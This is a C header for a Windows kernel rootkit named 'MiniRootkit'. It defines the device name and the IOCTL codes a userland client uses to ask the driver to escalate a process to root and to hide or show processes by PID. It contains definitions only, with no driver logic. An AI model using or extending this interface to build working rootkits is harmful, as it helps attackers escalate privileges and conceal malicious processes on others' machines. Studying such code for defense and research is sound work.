#ifndef __ROOTKIT_UAPI_H__
#define __ROOTKIT_UAPI_H__

#ifdef _NTDDK_  // Are we compiling a driver?
#include <ntifs.h>
#else  // We are in userland
#include <winioctl.h>
#endif  // _NTDDK_

#define DEV_NAME L"MiniRootkit"

#define IOCTL_ROOT_PID CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2600, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_PID CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2601, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SHOW_PID CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2602, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define PID_SIZE sizeof(LONG)
#define PID_SELF 0
#define PID_PARENT -1

typedef enum _MATCH_TYPE {          // Can be stored in 2 bits
    MATCH_TYPE_EXACT = 0b00UL,      // Match the entire string
    MATCH_TYPE_SUBSTRING = 0b01UL,  // Match anywhere in the string
    MATCH_TYPE_PREFIX = 0b10UL,     // Match the beginning of the string
    MATCH_TYPE_SUFFIX = 0b11UL,     // Match the end of the string
} MATCH_TYPE, *PMATCH_TYPE;

#endif  // __ROOTKIT_UAPI_H__
